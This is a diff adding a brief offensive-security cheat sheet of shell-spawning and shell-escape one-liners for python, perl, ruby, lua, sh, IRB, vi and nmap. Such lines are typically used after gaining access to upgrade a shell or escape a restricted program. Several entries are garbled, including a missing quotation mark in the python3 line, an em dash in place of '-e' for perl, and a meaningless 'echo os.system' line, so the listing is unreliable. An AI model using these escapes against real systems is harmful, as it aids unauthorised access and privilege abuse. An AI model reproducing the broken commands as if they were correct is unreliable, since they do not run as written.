@@ -1,0 +1,39 @@
+Shell Spawning
+
+#####python#####
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+#####python3#####
+python3 -c 'import pty; pty.spawn(/bin/sh")'
+
+#####bash#####
+echo os.system('/bin/bash')
+
+#####sh#####
+/bin/sh -i
+
+#####perl#####
+perl —e 'exec "/bin/sh";'
+
+#####perl#####
+perl: exec "/bin/sh";
+
+#####ruby#####
+ruby: exec "/bin/sh"
+
+#####lua#####
+lua: os.execute('/bin/sh')
+
+(From within IRB)
+exec "/bin/sh"
+
+(From within vi)
+:!bash
+
+(From within vi)
+:set shell=/bin/bash:shell
+
+(From within nmap)
+!sh
+
+
